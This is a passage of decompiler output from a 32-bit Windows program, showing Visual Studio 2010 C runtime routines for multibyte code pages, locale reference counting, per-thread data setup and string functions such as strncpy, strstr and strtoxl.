    *(int *)(param_2 + 0xc) = iVar9;
    puVar6 = (undefined2 *)(param_2 + 0x10);
    puVar8 = (undefined2 *)(&DAT_003d6aac + extraout_ECX);
    iVar9 = 6;
    do {
      *puVar6 = *puVar8;
      puVar8 = puVar8 + 1;
      puVar6 = puVar6 + 1;
      iVar9 = iVar9 + -1;
    } while (iVar9 != 0);
    goto LAB_003b7237;
  }
LAB_003b70f0:
  setSBCS(unaff_EDI);
  uVar10 = extraout_EDX_00;
LAB_003b729f:
  terminate_if_debugger_present(local_8 ^ (uint)&stack0xfffffffc,uVar10,in_stack_ffffffdc);
  return;
code_r0x003b710f:
  local_20 = (byte *)((int)local_20 + 1);
  uVar4 = uVar4 + 0x30;
  if (0xef < uVar4) goto code_r0x003b711c;
  goto LAB_003b7103;
code_r0x003b711c:
  uVar10 = extraout_EDX;
  if (((uVar3 == 65000) || (uVar3 == 0xfde9)) ||
     (BVar5 = IsValidCodePage(uVar3 & 0xffff), uVar10 = extraout_EDX_01, BVar5 == 0))
  goto LAB_003b729f;
  BVar5 = GetCPInfo(uVar3,(LPCPINFO)&local_1c);
  if (BVar5 != 0) {
    trim_string((undefined (*) [16])(param_2 + 0x1c),0,0x101);
    *(uint *)(param_2 + 4) = uVar3;
    *(undefined4 *)(param_2 + 0xc) = 0;
    if (local_1c.MaxCharSize < 2) {
      *(undefined4 *)(param_2 + 8) = 0;
    }
    else {
      if (local_1c.LeadByte[0] != '\0') {
        pbVar7 = local_1c.LeadByte + 1;
        do {
          bVar2 = *pbVar7;
          if (bVar2 == 0) break;
          for (uVar3 = (uint)pbVar7[-1]; uVar3 <= bVar2; uVar3 = uVar3 + 1) {
            pbVar1 = (byte *)(param_2 + 0x1d + uVar3);
            *pbVar1 = *pbVar1 | 4;
          }
          pbVar1 = pbVar7 + 1;
          pbVar7 = pbVar7 + 2;
        } while (*pbVar1 != 0);
      }
      pbVar7 = (byte *)(param_2 + 0x1e);
      iVar9 = 0xfe;
      do {
        *pbVar7 = *pbVar7 | 8;
        pbVar7 = pbVar7 + 1;
        iVar9 = iVar9 + -1;
      } while (iVar9 != 0);
      iVar9 = CPtoLCID((int)unaff_EDI);
      *(int *)(param_2 + 0xc) = iVar9;
      *(undefined4 *)(param_2 + 8) = extraout_EDX_04;
    }
    *(undefined4 *)(param_2 + 0x10) = 0;
    *(undefined4 *)(param_2 + 0x14) = 0;
    *(undefined4 *)(param_2 + 0x18) = 0;
LAB_003b7237:
    setSBUpLow(unaff_EDI);
    uVar10 = extraout_EDX_03;
    goto LAB_003b729f;
  }
  uVar10 = extraout_EDX_02;
  if (_DAT_003d869c == 0) goto LAB_003b729f;
  goto LAB_003b70f0;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  __setmbcp
// 
// Library: Visual Studio 2010 Release

int __cdecl __setmbcp(int _CodePage)

{
  _ptiddata p_Var1;
  int iVar2;
  pthreadmbcinfo ptVar3;
  LONG LVar4;
  int *piVar5;
  int iVar6;
  pthreadmbcinfo ptVar7;
  pthreadmbcinfo ptVar8;
  int in_stack_ffffffc8;
  int local_24;
  
  local_24 = -1;
  p_Var1 = __getptd();
  ___updatetmbcinfo();
  ptVar3 = p_Var1->ptmbcinfo;
  iVar2 = getSystemCP(in_stack_ffffffc8);
  if (iVar2 == ptVar3->mbcodepage) {
    local_24 = 0;
  }
  else {
    ptVar3 = (pthreadmbcinfo)__malloc_crt(0x220);
    if (ptVar3 != (pthreadmbcinfo)0x0) {
      ptVar7 = p_Var1->ptmbcinfo;
      ptVar8 = ptVar3;
      for (iVar6 = 0x88; iVar6 != 0; iVar6 = iVar6 + -1) {
        ptVar8->refcount = ptVar7->refcount;
        ptVar7 = (pthreadmbcinfo)&ptVar7->mbcodepage;
        ptVar8 = (pthreadmbcinfo)&ptVar8->mbcodepage;
      }
      ptVar3->refcount = 0;
      local_24 = __setmbcp_nolock(iVar2,(int)ptVar3);
      if (local_24 == 0) {
        LVar4 = InterlockedDecrement(&p_Var1->ptmbcinfo->refcount);
        if ((LVar4 == 0) && (p_Var1->ptmbcinfo != (pthreadmbcinfo)&DAT_003d6678)) {
          _free(p_Var1->ptmbcinfo);
        }
        p_Var1->ptmbcinfo = ptVar3;
        InterlockedIncrement((LONG *)ptVar3);
        if (((*(byte *)&p_Var1->_ownlocale & 2) == 0) && (((byte)DAT_003d6b98 & 1) == 0)) {
          __lock(0xd);
          _DAT_003d86ac = ptVar3->mbcodepage;
          _DAT_003d86b0 = ptVar3->ismbcodepage;
          _DAT_003d86b4 = *(undefined4 *)ptVar3->mbulinfo;
          for (iVar2 = 0; iVar2 < 5; iVar2 = iVar2 + 1) {
            (&DAT_003d86a0)[iVar2] = ptVar3->mbulinfo[iVar2 + 2];
          }
          for (iVar2 = 0; iVar2 < 0x101; iVar2 = iVar2 + 1) {
            (&DAT_003d6898)[iVar2] = ptVar3->mbctype[iVar2 + 4];
          }
          for (iVar2 = 0; iVar2 < 0x100; iVar2 = iVar2 + 1) {
            (&DAT_003d69a0)[iVar2] = ptVar3->mbcasemap[iVar2 + 4];
          }
          LVar4 = InterlockedDecrement((LONG *)lpAddend_003d6aa0);
          if ((LVar4 == 0) && (lpAddend_003d6aa0 != &DAT_003d6678)) {
            _free(lpAddend_003d6aa0);
          }
          lpAddend_003d6aa0 = (undefined *)ptVar3;
          InterlockedIncrement((LONG *)ptVar3);
          FUN_003b740f();
        }
      }
      else {
        if (local_24 == -1) {
          if (ptVar3 != (pthreadmbcinfo)&DAT_003d6678) {
            _free(ptVar3);
          }
          piVar5 = __errno();
          *piVar5 = 0x16;
        }
      }
    }
  }
  return local_24;
}



void FUN_003b740f(void)

{
  FUN_003b8677(0xd);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  ___initmbctable
// 
// Library: Visual Studio 2010 Release

undefined4 ___initmbctable(void)

{
  if (_DAT_003ea16c == 0) {
    __setmbcp(-3);
    _DAT_003ea16c = 1;
  }
  return 0;
}



// Library Function - Single Match
//  ___addlocaleref
// 
// Library: Visual Studio 2010 Release

void __cdecl ___addlocaleref(LONG *param_1)

{
  LONG *pLVar1;
  LONG **ppLVar2;
  
  pLVar1 = param_1;
  InterlockedIncrement(param_1);
  if ((LONG *)param_1[0x2c] != (LONG *)0x0) {
    InterlockedIncrement((LONG *)param_1[0x2c]);
  }
  if ((LONG *)param_1[0x2e] != (LONG *)0x0) {
    InterlockedIncrement((LONG *)param_1[0x2e]);
  }
  if ((LONG *)param_1[0x2d] != (LONG *)0x0) {
    InterlockedIncrement((LONG *)param_1[0x2d]);
  }
  if ((LONG *)param_1[0x30] != (LONG *)0x0) {
    InterlockedIncrement((LONG *)param_1[0x30]);
  }
  ppLVar2 = (LONG **)(param_1 + 0x14);
  param_1 = (LONG *)0x6;
  do {
    if ((ppLVar2[-2] != (LONG *)&DAT_003d6b9c) && (*ppLVar2 != (LONG *)0x0)) {
      InterlockedIncrement(*ppLVar2);
    }
    if ((ppLVar2[-1] != (LONG *)0x0) && (ppLVar2[1] != (LONG *)0x0)) {
      InterlockedIncrement(ppLVar2[1]);
    }
    ppLVar2 = ppLVar2 + 4;
    param_1 = (LONG *)((int)param_1 + -1);
  } while (param_1 != (LONG *)0x0);
  InterlockedIncrement((LONG *)(pLVar1[0x35] + 0xb4));
  return;
}



// Library Function - Single Match
//  ___removelocaleref
// 
// Library: Visual Studio 2010 Release

LONG * __cdecl ___removelocaleref(LONG *param_1)

{
  LONG *pLVar1;
  LONG **ppLVar2;
  
  pLVar1 = param_1;
  if (param_1 != (LONG *)0x0) {
    InterlockedDecrement(param_1);
    if ((LONG *)param_1[0x2c] != (LONG *)0x0) {
      InterlockedDecrement((LONG *)param_1[0x2c]);
    }
    if ((LONG *)param_1[0x2e] != (LONG *)0x0) {
      InterlockedDecrement((LONG *)param_1[0x2e]);
    }
    if ((LONG *)param_1[0x2d] != (LONG *)0x0) {
      InterlockedDecrement((LONG *)param_1[0x2d]);
    }
    if ((LONG *)param_1[0x30] != (LONG *)0x0) {
      InterlockedDecrement((LONG *)param_1[0x30]);
    }
    ppLVar2 = (LONG **)(param_1 + 0x14);
    param_1 = (LONG *)0x6;
    do {
      if ((ppLVar2[-2] != (LONG *)&DAT_003d6b9c) && (*ppLVar2 != (LONG *)0x0)) {
        InterlockedDecrement(*ppLVar2);
      }
      if ((ppLVar2[-1] != (LONG *)0x0) && (ppLVar2[1] != (LONG *)0x0)) {
        InterlockedDecrement(ppLVar2[1]);
      }
      ppLVar2 = ppLVar2 + 4;
      param_1 = (LONG *)((int)param_1 + -1);
    } while (param_1 != (LONG *)0x0);
    InterlockedDecrement((LONG *)(pLVar1[0x35] + 0xb4));
  }
  return pLVar1;
}



// Library Function - Single Match
//  ___freetlocinfo
// 
// Library: Visual Studio 2010 Release

void __cdecl ___freetlocinfo(void *param_1)

{
  int *piVar1;
  undefined **ppuVar2;
  void *_Memory;
  int **ppiVar3;
  
  _Memory = param_1;
  if ((((*(undefined ***)((int)param_1 + 0xbc) != (undefined **)0x0) &&
       (*(undefined ***)((int)param_1 + 0xbc) != &PTR_DAT_003d6468)) &&
      (*(int **)((int)param_1 + 0xb0) != (int *)0x0)) && (**(int **)((int)param_1 + 0xb0) == 0)) {
    piVar1 = *(int **)((int)param_1 + 0xb8);
    if ((piVar1 != (int *)0x0) && (*piVar1 == 0)) {
      _free(piVar1);
      ___free_lconv_mon(*(int *)((int)param_1 + 0xbc));
    }
    piVar1 = *(int **)((int)param_1 + 0xb4);
    if ((piVar1 != (int *)0x0) && (*piVar1 == 0)) {
      _free(piVar1);
      ___free_lconv_num(*(void ***)((int)param_1 + 0xbc));
    }
    _free(*(void **)((int)param_1 + 0xb0));
    _free(*(void **)((int)param_1 + 0xbc));
  }
  if ((*(int **)((int)param_1 + 0xc0) != (int *)0x0) && (**(int **)((int)param_1 + 0xc0) == 0)) {
    _free((void *)(*(int *)((int)param_1 + 0xc4) + -0xfe));
    _free((void *)(*(int *)((int)param_1 + 0xcc) + -0x80));
    _free((void *)(*(int *)((int)param_1 + 0xd0) + -0x80));
    _free(*(void **)((int)param_1 + 0xc0));
  }
  ppuVar2 = *(undefined ***)((int)param_1 + 0xd4);
  if ((ppuVar2 != &PTR_DAT_003d6ba0) && (ppuVar2[0x2d] == (undefined *)0x0)) {
    ___free_lc_time(ppuVar2);
    _free(*(void **)((int)param_1 + 0xd4));
  }
  ppiVar3 = (int **)((int)param_1 + 0x50);
  param_1 = (void *)0x6;
  do {
    if (((ppiVar3[-2] != (int *)&DAT_003d6b9c) && (piVar1 = *ppiVar3, piVar1 != (int *)0x0)) &&
       (*piVar1 == 0)) {
      _free(piVar1);
    }
    if (((ppiVar3[-1] != (int *)0x0) && (piVar1 = ppiVar3[1], piVar1 != (int *)0x0)) &&
       (*piVar1 == 0)) {
      _free(piVar1);
    }
    ppiVar3 = ppiVar3 + 4;
    param_1 = (void *)((int)param_1 + -1);
  } while (param_1 != (void *)0x0);
  _free(_Memory);
  return;
}



// Library Function - Single Match
//  __updatetlocinfoEx_nolock
// 
// Library: Visual Studio 2010 Release

LONG * __cdecl __updatetlocinfoEx_nolock(LONG **param_1,LONG *param_2)

{
  LONG *pLVar1;
  
  if ((param_2 == (LONG *)0x0) || (param_1 == (LONG **)0x0)) {
    param_2 = (LONG *)0x0;
  }
  else {
    pLVar1 = *param_1;
    if (pLVar1 != param_2) {
      *param_1 = param_2;
      ___addlocaleref(param_2);
      if (((pLVar1 != (LONG *)0x0) && (___removelocaleref(pLVar1), *pLVar1 == 0)) &&
         (pLVar1 != (LONG *)&DAT_003d6d08)) {
        ___freetlocinfo(pLVar1);
      }
    }
  }
  return param_2;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  ___updatetlocinfo
// 
// Library: Visual Studio 2010 Release

pthreadlocinfo __cdecl ___updatetlocinfo(void)

{
  _ptiddata p_Var1;
  pthreadlocinfo ptVar2;
  
  p_Var1 = __getptd();
  if (((p_Var1->_ownlocale & DAT_003d6b98) == 0) || (p_Var1->ptlocinfo == (pthreadlocinfo)0x0)) {
    __lock(0xc);
    ptVar2 = (pthreadlocinfo)&p_Var1->ptlocinfo;
    __updatetlocinfoEx_nolock((LONG **)ptVar2,(LONG *)PTR_DAT_003d6de0);
    FUN_003b7793();
  }
  else {
    p_Var1 = __getptd();
    ptVar2 = p_Var1->ptlocinfo;
  }
  if (ptVar2 == (pthreadlocinfo)0x0) {
    __amsg_exit(0x20);
  }
  return ptVar2;
}



void FUN_003b7793(void)

{
  FUN_003b8677(0xc);
  return;
}



void FUN_003b779f(void)

{
  EncodePointer((PVOID)0x0);
  return;
}



// Library Function - Single Match
//  ___set_flsgetvalue
// 
// Library: Visual Studio 2010 Release

LPVOID ___set_flsgetvalue(void)

{
  LPVOID lpTlsValue;
  
  lpTlsValue = TlsGetValue(dwTlsIndex_003d6df0);
  if (lpTlsValue == (LPVOID)0x0) {
    lpTlsValue = DecodePointer(lpTlsValue_003d86bc);
    TlsSetValue(dwTlsIndex_003d6df0,lpTlsValue);
  }
  return lpTlsValue;
}



void FUN_003b77e5(void)

{
  LPCRITICAL_SECTION lpCriticalSection;
  code *pcVar1;
  LPCRITICAL_SECTION *pp_Var2;
  int iVar3;
  
  if (DAT_003d6dec != -1) {
    iVar3 = DAT_003d6dec;
    pcVar1 = (code *)DecodePointer(Ptr_003d86c4);
    (*pcVar1)(iVar3);
    DAT_003d6dec = -1;
  }
  if (dwTlsIndex_003d6df0 != 0xffffffff) {
    TlsFree(dwTlsIndex_003d6df0);
    dwTlsIndex_003d6df0 = 0xffffffff;
  }
  pp_Var2 = &lpCriticalSection_003d6e40;
  do {
    lpCriticalSection = *pp_Var2;
    if ((lpCriticalSection != (LPCRITICAL_SECTION)0x0) && (pp_Var2[1] != (LPCRITICAL_SECTION)0x1)) {
      DeleteCriticalSection(lpCriticalSection);
      _free(lpCriticalSection);
      *pp_Var2 = (LPCRITICAL_SECTION)0x0;
    }
    pp_Var2 = pp_Var2 + 2;
  } while ((int)pp_Var2 < 0x3d6f60);
  pp_Var2 = &lpCriticalSection_003d6e40;
  do {
    if ((*pp_Var2 != (LPCRITICAL_SECTION)0x0) && (pp_Var2[1] == (LPCRITICAL_SECTION)0x1)) {
      DeleteCriticalSection(*pp_Var2);
    }
    pp_Var2 = pp_Var2 + 2;
  } while ((int)pp_Var2 < 0x3d6f60);
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __initptd
// 
// Library: Visual Studio 2010 Release

void __cdecl __initptd(_ptiddata _Ptd,pthreadlocinfo _Locale)

{
  GetModuleHandleW(L"KERNEL32.DLL");
  _Ptd->_pxcptacttab = &DAT_003c8188;
  _Ptd->_terrno = 0;
  _Ptd->_holdrand = 1;
  _Ptd->_ownlocale = 1;
  *(undefined *)((_Ptd->_setloc_data)._cachein + 8) = 0x43;
  *(undefined *)((int)(_Ptd->_setloc_data)._cachein + 0x93) = 0x43;
  _Ptd->ptmbcinfo = (pthreadmbcinfo)&DAT_003d6678;
  __lock(0xd);
  InterlockedIncrement(&_Ptd->ptmbcinfo->refcount);
  FUN_003b78c4();
  __lock(0xc);
  _Ptd->ptlocinfo = _Locale;
  if (_Locale == (pthreadlocinfo)0x0) {
    _Ptd->ptlocinfo = (pthreadlocinfo)PTR_DAT_003d6de0;
  }
  ___addlocaleref(&_Ptd->ptlocinfo->refcount);
  FUN_003b78cd();
  return;
}



void FUN_003b78c4(void)

{
  FUN_003b8677(0xd);
  return;
}



void FUN_003b78cd(void)

{
  FUN_003b8677(0xc);
  return;
}



// Library Function - Single Match
//  __getptd_noexit
// 
// Library: Visual Studio 2010 Release

_ptiddata __cdecl __getptd_noexit(void)

{
  DWORD dwErrCode;
  code *pcVar1;
  _ptiddata _Ptd;
  int iVar2;
  DWORD DVar3;
  undefined4 uVar4;
  _ptiddata p_Var5;
  
  dwErrCode = GetLastError();
  uVar4 = DAT_003d6dec;
  pcVar1 = (code *)___set_flsgetvalue();
  _Ptd = (_ptiddata)(*pcVar1)(uVar4);
  if (_Ptd == (_ptiddata)0x0) {
    _Ptd = (_ptiddata)__calloc_crt(1,0x214);
    if (_Ptd != (_ptiddata)0x0) {
      uVar4 = DAT_003d6dec;
      p_Var5 = _Ptd;
      pcVar1 = (code *)DecodePointer(Ptr_003d86c0);
      iVar2 = (*pcVar1)(uVar4,p_Var5);
      if (iVar2 == 0) {
        _free(_Ptd);
        _Ptd = (_ptiddata)0x0;
      }
      else {
        __initptd(_Ptd,(pthreadlocinfo)0x0);
        DVar3 = GetCurrentThreadId();
        _Ptd->_thandle = 0xffffffff;
        _Ptd->_tid = DVar3;
      }
    }
  }
  SetLastError(dwErrCode);
  return _Ptd;
}



// Library Function - Single Match
//  __getptd
// 
// Library: Visual Studio 2010 Release

_ptiddata __cdecl __getptd(void)

{
  _ptiddata p_Var1;
  
  p_Var1 = __getptd_noexit();
  if (p_Var1 == (_ptiddata)0x0) {
    __amsg_exit(0x10);
  }
  return p_Var1;
}



void FUN_003b7a83(void)

{
  FUN_003b8677(0xd);
  return;
}



void FUN_003b7a8f(void)

{
  FUN_003b8677(0xc);
  return;
}



// Library Function - Single Match
//  __mtinit
// 
// Library: Visual Studio 2010 Release

int __cdecl __mtinit(void)

{
  HMODULE hModule;
  BOOL BVar1;
  int iVar2;
  code *pcVar3;
  _ptiddata _Ptd;
  DWORD DVar4;
  undefined *puVar5;
  _ptiddata p_Var6;
  
  hModule = GetModuleHandleW(L"KERNEL32.DLL");
  if (hModule == (HMODULE)0x0) {
    FUN_003b77e5();
    return 0;
  }
  Ptr_003d86b8 = GetProcAddress(hModule,"FlsAlloc");
  lpTlsValue_003d86bc = GetProcAddress(hModule,"FlsGetValue");
  Ptr_003d86c0 = GetProcAddress(hModule,"FlsSetValue");
  Ptr_003d86c4 = GetProcAddress(hModule,"FlsFree");
  if ((((Ptr_003d86b8 == (PVOID)0x0) || (lpTlsValue_003d86bc == (PVOID)0x0)) ||
      (Ptr_003d86c0 == (PVOID)0x0)) || ((FARPROC)Ptr_003d86c4 == (FARPROC)0x0)) {
    lpTlsValue_003d86bc = TlsGetValue_exref;
    Ptr_003d86b8 = &LAB_003b77a8;
    Ptr_003d86c0 = TlsSetValue_exref;
    Ptr_003d86c4 = TlsFree_exref;
  }
  dwTlsIndex_003d6df0 = TlsAlloc();
  if ((dwTlsIndex_003d6df0 != 0xffffffff) &&
     (BVar1 = TlsSetValue(dwTlsIndex_003d6df0,lpTlsValue_003d86bc), BVar1 != 0)) {
    __init_pointers();
    Ptr_003d86b8 = EncodePointer(Ptr_003d86b8);
    lpTlsValue_003d86bc = EncodePointer(lpTlsValue_003d86bc);
    Ptr_003d86c0 = EncodePointer(Ptr_003d86c0);
    Ptr_003d86c4 = EncodePointer(Ptr_003d86c4);
    iVar2 = __mtinitlocks();
    if (iVar2 != 0) {
      puVar5 = &LAB_003b7969;
      pcVar3 = (code *)DecodePointer(Ptr_003d86b8);
      DAT_003d6dec = (*pcVar3)(puVar5);
      if ((DAT_003d6dec != -1) && (_Ptd = (_ptiddata)__calloc_crt(1,0x214), _Ptd != (_ptiddata)0x0))
      {
        iVar2 = DAT_003d6dec;
        p_Var6 = _Ptd;
        pcVar3 = (code *)DecodePointer(Ptr_003d86c0);
        iVar2 = (*pcVar3)(iVar2,p_Var6);
        if (iVar2 != 0) {
          __initptd(_Ptd,(pthreadlocinfo)0x0);
          DVar4 = GetCurrentThreadId();
          _Ptd->_thandle = 0xffffffff;
          _Ptd->_tid = DVar4;
          return 1;
        }
      }
    }
    FUN_003b77e5();
  }
  return 0;
}



// Library Function - Single Match
//  _strncpy
// 
// Library: Visual Studio 2010 Release

char * __cdecl _strncpy(char *_Dest,char *_Source,size_t _Count)

{
  uint uVar1;
  uint uVar2;
  char cVar3;
  uint uVar4;
  uint *puVar5;
  
  if (_Count == 0) {
    return _Dest;
  }
  puVar5 = (uint *)_Dest;
  if (((uint)_Source & 3) != 0) {
    while( true ) {
      cVar3 = *_Source;
      _Source = (char *)((int)_Source + 1);
      *(char *)puVar5 = cVar3;
      puVar5 = (uint *)((int)puVar5 + 1);
      _Count = _Count - 1;
      if (_Count == 0) {
        return _Dest;
      }
      if (cVar3 == '\0') break;
      if (((uint)_Source & 3) == 0) {
        uVar4 = _Count >> 2;
        goto joined_r0x003b7c6c;
      }
    }
    do {
      if (((uint)puVar5 & 3) == 0) {
        uVar4 = _Count >> 2;
        if (uVar4 == 0) goto LAB_003b7cb3;
        goto LAB_003b7d29;
      }
      *(undefined *)puVar5 = 0;
      puVar5 = (uint *)((int)puVar5 + 1);
      _Count = _Count - 1;
    } while (_Count != 0);
    return _Dest;
  }
  uVar4 = _Count >> 2;
  if (uVar4 != 0) {
    do {
      uVar1 = *(uint *)_Source;
      uVar2 = *(uint *)_Source;
      _Source = (char *)((int)_Source + 4);
      if (((uVar1 ^ 0xffffffff ^ uVar1 + 0x7efefeff) & 0x81010100) != 0) {
        if ((char)uVar2 == '\0') {
          *puVar5 = 0;
joined_r0x003b7d25:
          while( true ) {
            uVar4 = uVar4 - 1;
            puVar5 = puVar5 + 1;
            if (uVar4 == 0) break;
LAB_003b7d29:
            *puVar5 = 0;
          }
          cVar3 = '\0';
          _Count = _Count & 3;
          if (_Count != 0) goto LAB_003b7cb3;
          return _Dest;
        }
        if ((char)(uVar2 >> 8) == '\0') {
          *puVar5 = uVar2 & 0xff;
          goto joined_r0x003b7d25;
        }
        if ((uVar2 & 0xff0000) == 0) {
          *puVar5 = uVar2 & 0xffff;
          goto joined_r0x003b7d25;
        }
        if ((uVar2 & 0xff000000) == 0) {
          *puVar5 = uVar2;
          goto joined_r0x003b7d25;
        }
      }
      *puVar5 = uVar2;
      puVar5 = puVar5 + 1;
      uVar4 = uVar4 - 1;
joined_r0x003b7c6c:
    } while (uVar4 != 0);
    _Count = _Count & 3;
    if (_Count == 0) {
      return _Dest;
    }
  }
  do {
    cVar3 = *_Source;
    _Source = (char *)((int)_Source + 1);
    *(char *)puVar5 = cVar3;
    puVar5 = (uint *)((int)puVar5 + 1);
    if (cVar3 == '\0') {
      while (_Count = _Count - 1, _Count != 0) {
LAB_003b7cb3:
        *(char *)puVar5 = cVar3;
        puVar5 = (uint *)((int)puVar5 + 1);
      }
      return _Dest;
    }
    _Count = _Count - 1;
  } while (_Count != 0);
  return _Dest;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  __calloc_impl
// 
// Library: Visual Studio 2010 Release

LPVOID __cdecl __calloc_impl(uint param_1,uint param_2,undefined4 *param_3)

{
  int *piVar1;
  LPVOID pvVar2;
  int iVar3;
  uint dwBytes;
  
  if ((param_1 != 0) && (0xffffffe0 / param_1 < param_2)) {
    piVar1 = __errno();
    *piVar1 = 0xc;
    return (LPVOID)0x0;
  }
  dwBytes = param_1 * param_2;
  if (dwBytes == 0) {
    dwBytes = 1;
  }
  do {
    pvVar2 = (LPVOID)0x0;
    if ((dwBytes < 0xffffffe1) &&
       (pvVar2 = HeapAlloc(hHeap_003d802c,8,dwBytes), pvVar2 != (LPVOID)0x0)) {
      return pvVar2;
    }
    if (_DAT_003d8694 == 0) {
      if (param_3 == (undefined4 *)0x0) {
        return pvVar2;
      }
      *param_3 = 0xc;
      return pvVar2;
    }
    iVar3 = __callnewh(dwBytes);
  } while (iVar3 != 0);
  if (param_3 != (undefined4 *)0x0) {
    *param_3 = 0xc;
  }
  return (LPVOID)0x0;
}



// Library Function - Single Match
//  _strstr
// 
// Library: Visual Studio 2010 Release

char * __cdecl _strstr(char *_Str,char *_SubStr)

{
  char *pcVar1;
  char *pcVar2;
  char cVar3;
  uint uVar4;
  char cVar5;
  uint uVar6;
  uint uVar7;
  char *pcVar8;
  uint *puVar9;
  char *pcVar10;
  
  cVar3 = *_SubStr;
  if (cVar3 == '\0') {
    return (char *)(uint *)_Str;
  }
  if (_SubStr[1] == '\0') {
    uVar4 = (uint)_Str & 3;
    while (uVar4 != 0) {
      if (*_Str == cVar3) {
        return (char *)(uint *)_Str;
      }
      if (*_Str == '\0') {
        return (char *)(uint *)0x0;
      }
      uVar4 = (uint)(uint *)((int)_Str + 1) & 3;
      _Str = (char *)(uint *)((int)_Str + 1);
    }
    while( true ) {
      while( true ) {
        uVar4 = *(uint *)_Str;
        uVar7 = uVar4 ^ CONCAT22(CONCAT11(cVar3,cVar3),CONCAT11(cVar3,cVar3));
        uVar6 = uVar4 ^ 0xffffffff ^ uVar4 + 0x7efefeff;
        puVar9 = (uint *)((int)_Str + 4);
        if (((uVar7 ^ 0xffffffff ^ uVar7 + 0x7efefeff) & 0x81010100) != 0) break;
        _Str = (char *)puVar9;
        if ((uVar6 & 0x81010100) != 0) {
          if ((uVar6 & 0x1010100) != 0) {
            return (char *)(uint *)0x0;
          }
          if ((uVar4 + 0x7efefeff & 0x80000000) == 0) {
            return (char *)(uint *)0x0;
          }
        }
      }
      uVar4 = *(uint *)_Str;
      if ((char)uVar4 == cVar3) {
        return (char *)(uint *)_Str;
      }
      if ((char)uVar4 == '\0') {
        return (char *)(uint *)0x0;
      }
      cVar5 = (char)(uVar4 >> 8);
      if (cVar5 == cVar3) {
        return (char *)(uint *)((int)_Str + 1);
      }
      if (cVar5 == '\0') break;
      cVar5 = (char)(uVar4 >> 0x10);
      if (cVar5 == cVar3) {
        return (char *)(uint *)((int)_Str + 2);
      }
      if (cVar5 == '\0') {
        return (char *)(uint *)0x0;
      }
      cVar5 = (char)(uVar4 >> 0x18);
      if (cVar5 == cVar3) {
        return (char *)(uint *)((int)_Str + 3);
      }
      _Str = (char *)puVar9;
      if (cVar5 == '\0') {
        return (char *)(uint *)0x0;
      }
    }
    return (char *)(uint *)0x0;
  }
  do {
    cVar5 = *_Str;
    do {
      while (_Str = _Str + 1, cVar5 != cVar3) {
        if (cVar5 == '\0') {
          return (char *)(uint *)0x0;
        }
        cVar5 = *_Str;
      }
      cVar5 = *_Str;
      pcVar10 = _Str + 1;
      pcVar8 = _SubStr;
    } while (cVar5 != _SubStr[1]);
    do {
      if (pcVar8[2] == '\0') {
LAB_003b7e49:
        return (char *)(uint *)(_Str + -1);
      }
      if (*pcVar10 != pcVar8[2]) break;
      pcVar1 = pcVar8 + 3;
      if (*pcVar1 == '\0') goto LAB_003b7e49;
      pcVar2 = pcVar10 + 1;
      pcVar8 = pcVar8 + 2;
      pcVar10 = pcVar10 + 2;
    } while (*pcVar1 == *pcVar2);
  } while( true );
}



// Library Function - Single Match
//  unsigned long __cdecl strtoxl(struct localeinfo_struct *,char const *,char const * *,int,int)
// 
// Library: Visual Studio 2010 Release

unsigned_long __cdecl
strtoxl(localeinfo_struct *param_1,char *param_2,char **param_3,int param_4,int param_5)

{
  ushort uVar1;
  byte *pbVar2;
  int *piVar3;
  uint uVar4;
  pthreadlocinfo ptVar5;
  uint uVar6;
  int iVar7;
  byte bVar8;
  byte *pbVar9;
  localeinfo_struct local_20;
  int local_18;
  char local_14;
  uint local_c;
  unsigned_long local_8;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_20,param_1);
  if (param_3 != (char **)0x0) {
    *param_3 = param_2;
  }
  if ((param_2 == (char *)0x0) || ((param_4 != 0 && ((param_4 < 2 || (0x24 < param_4)))))) {
    piVar3 = __errno();
    *piVar3 = 0x16;
    FUN_003b60f9();
    if (local_14 != '\0') {
      *(uint *)(local_18 + 0x70) = *(uint *)(local_18 + 0x70) & 0xfffffffd;
    }
    return 0;
  }
  local_8 = 0;
  bVar8 = *param_2;
  ptVar5 = local_20.locinfo;
  pbVar2 = (byte *)param_2;
  while( true ) {
    pbVar9 = pbVar2 + 1;
    if ((int)ptVar5->locale_name[3] < 2) {
      uVar4 = *(ushort *)(ptVar5[1].lc_category[0].locale + (uint)bVar8 * 2) & 8;
    }
    else {
      uVar4 = __isctype_l((uint)bVar8,8,(_locale_t)&local_20);
      ptVar5 = local_20.locinfo;
    }
    if (uVar4 == 0) break;
    bVar8 = *pbVar9;
    pbVar2 = pbVar9;
  }
  if (bVar8 == 0x2d) {
    param_5 = param_5 | 2;
LAB_003b7f07:
    bVar8 = *pbVar9;
    pbVar9 = pbVar2 + 2;
  }
  else {
    if (bVar8 == 0x2b) goto LAB_003b7f07;
  }
  if (((param_4 < 0) || (param_4 == 1)) || (0x24 < param_4)) {
    if (param_3 != (char **)0x0) {
      *param_3 = param_2;
    }
    if (local_14 != '\0') {
      *(uint *)(local_18 + 0x70) = *(uint *)(local_18 + 0x70) & 0xfffffffd;
    }
    return 0;
  }
  if (param_4 == 0) {
    if (bVar8 != 0x30) {
      param_4 = 10;
      goto LAB_003b7f6f;
    }
    if ((*pbVar9 != 0x78) && (*pbVar9 != 0x58)) {
      param_4 = 8;
      goto LAB_003b7f6f;
    }
    param_4 = 0x10;
  }
  else {
    if ((param_4 != 0x10) || (bVar8 != 0x30)) goto LAB_003b7f6f;
  }
  if ((*pbVar9 == 0x78) || (*pbVar9 == 0x58)) {
    bVar8 = pbVar9[1];
    pbVar9 = pbVar9 + 2;
  }
LAB_003b7f6f:
  uVar4 = (uint)(0xffffffff / (ulonglong)(uint)param_4);
  local_c = (uint)(0xffffffff % (ulonglong)(uint)param_4);
  do {
    uVar1 = *(ushort *)(ptVar5[1].lc_category[0].locale + (uint)bVar8 * 2);
